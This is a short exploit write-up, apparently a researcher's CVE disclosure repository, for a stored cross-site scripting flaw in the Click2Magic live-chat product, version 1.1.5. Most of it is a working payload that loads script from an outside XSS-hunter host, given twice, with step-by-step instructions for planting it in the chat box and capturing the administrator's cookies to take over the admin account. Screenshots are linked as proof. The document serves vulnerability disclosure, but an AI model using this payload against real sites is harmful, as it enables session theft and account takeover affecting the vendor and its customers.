# CVE
This is my Repo for the CVE MITRE 



# Exploit Title: [Stored Cross Site Scripting]
# Date: 05/04/2022
# Exploit Author: [Shivam Verma(cyb3r_n3rd)]
# Vendor Homepage: [https://www.click2magic.com/]
# Software Link: [https://play.google.com/store/apps/details?id=com.tvisha.click2magic&hl=en_IN]
# Version: [1.1.5] 
# Tested on: [Kali Linux 2021.4]


Vulnerability Name: Stored Cross Site Scripting
Vulnerability Description: In this Scenario the payload is getting stored in the Server and delivering us the admin cookies we can capture admin cookies and see all the data in admin panel

Payload: "><script src=https://nick413.xss.ht></script>

Steps to reproduce: 
Step1: Goto Url: https://www.click2magic.com OR Download the app from the above link
STep2: Start a chat 
Step3: Put payload in the chat box
Payload: "><script src=https://nick413.xss.ht></script>
Step4: Wait for the admin to click on the link 
Step5: you will see the popup and getting admin cookies Confirming the Execution of payload

POC: 
![Screenshot (217)](https://user-images.githubusercontent.com/71320606/161679689-af4f576f-1df9-46a4-9c65-86d168e3f277.png)

Admin Account takeover Screenshot

![WhatsApp Image 2022-04-05 at 10 47 03 AM](https://user-images.githubusercontent.com/71320606/161683950-e137aea3-f505-4162-bd82-405cfeb53c85.jpeg)
